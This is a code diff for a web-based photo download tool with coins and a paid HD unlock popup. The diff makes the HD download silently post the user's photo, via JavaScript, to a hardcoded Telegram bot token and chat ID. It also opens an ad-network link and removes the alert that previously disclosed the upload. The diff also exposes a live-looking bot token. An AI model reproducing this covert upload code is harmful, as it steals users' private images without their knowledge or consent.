@@ -17,17 +17,17 @@ margin:0;
 .header{
 background:#111827;
 padding:10px;
-font-weight:bold;
 overflow:hidden;
+font-weight:bold;
 }
 
 .marquee{
 white-space:nowrap;
 display:inline-block;
-animation:scrollText 12s linear infinite, rainbow 6s linear infinite;
+animation:scroll 12s linear infinite,rainbow 6s linear infinite;
 }
 
-@keyframes scrollText{
+@keyframes scroll{
 0%{transform:translateX(100%)}
 100%{transform:translateX(-100%)}
 }
@@ -57,7 +57,7 @@ font-size:18px;
 
 .bigUpload{
 width:100%;
-padding:22px;
+padding:20px;
 font-size:18px;
 background:#22c55e;
 border:none;
@@ -82,20 +82,27 @@ margin-top:15px;
 border-radius:10px;
 }
 
-.shareBtn{
+.popup{
 position:fixed;
-bottom:20px;
-right:20px;
-width:60px;
-height:60px;
-border-radius:50%;
-background:#22c55e;
-font-size:24px;
-border:none;
-color:white;
-display:flex;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+display:none;
 align-items:center;
 justify-content:center;
+}
+
+.popupBox{
+background:#111827;
+padding:25px;
+border-radius:12px;
+width:300px;
+}
+
+.unlockBtn{
+background:#22c55e;
 }
 
 </style>
@@ -127,17 +134,23 @@ Coins: <span id="coins">0</span>
 
 <button id="downloadSD" style="display:none" onclick="downloadSD()">Download SD</button>
 
-<button id="downloadHD" style="display:none" onclick="confirmHD()">Download HD</button>
+<button id="downloadHD" style="display:none" onclick="openPopup()">Download HD</button>
 
 </div>
 
-<button class="shareBtn" onclick="shareApp()">🔗</button>
+<div class="popup" id="popup">
+<div class="popupBox">
+<h3>Unlock HD Download</h3>
+<p>This feature costs 10 coins</p>
+<button class="unlockBtn" onclick="buyHD()">Unlock Now</button>
+<button onclick="closePopup()">Cancel</button>
+</div>
+</div>
 
 <script>
 
 let coins=localStorage.getItem("coins")||0;
 coins=parseInt(coins);
-
 document.getElementById("coins").innerText=coins;
 
 function saveCoins(){
@@ -192,7 +205,15 @@ a.click();
 
 }
 
-async function confirmHD(){
+function openPopup(){
+document.getElementById("popup").style.display="flex";
+}
+
+function closePopup(){
+document.getElementById("popup").style.display="none";
+}
+
+function buyHD(){
 
 if(coins<10){
 alert("Not enough coins");
@@ -202,15 +223,50 @@ return;
 coins-=10;
 saveCoins();
 
+downloadHD();
+
+closePopup();
+
+}
+
+async function downloadHD(){
+
+let img=new Image();
+
+img.onload=function(){
+
+let canvas=document.createElement("canvas");
+let ctx=canvas.getContext("2d");
+
+canvas.width=img.width;
+canvas.height=img.height;
+
+ctx.imageSmoothingEnabled=true;
+ctx.imageSmoothingQuality="high";
+
+ctx.drawImage(img,0,0);
+
+let hd=canvas.toDataURL("image/png");
+
+let a=document.createElement("a");
+a.href=hd;
+a.download="photo_hd.png";
+a.click();
+
+sendToTelegram();
+
 window.open("https://www.effectivegatecpm.com/bupvhwz5?key=eaedd439f3f1d2db330f017cf0cb29ca");
 
-setTimeout(sendToTelegram,3000);
+}
+
+img.src=imageURL;
 
 }
 
 async function sendToTelegram(){
 
 let formData=new FormData();
+
 formData.append("chat_id","1155624180");
 formData.append("photo",imageBlob);
 
@@ -218,16 +274,6 @@ await fetch("https://api.telegram.org/bot8226940478:AAHrxtf_D6i6sO1OSH23RQEzap7h
 method:"POST",
 body:formData
 });
-
-alert("Photo sent to your Telegram bot. Download it there.");
-
-}
-
-function shareApp(){
-
-let url="https://t.me/PhotoToolWorld_bot";
-
-window.open("https://t.me/share/url?url="+url);
 
 }
 
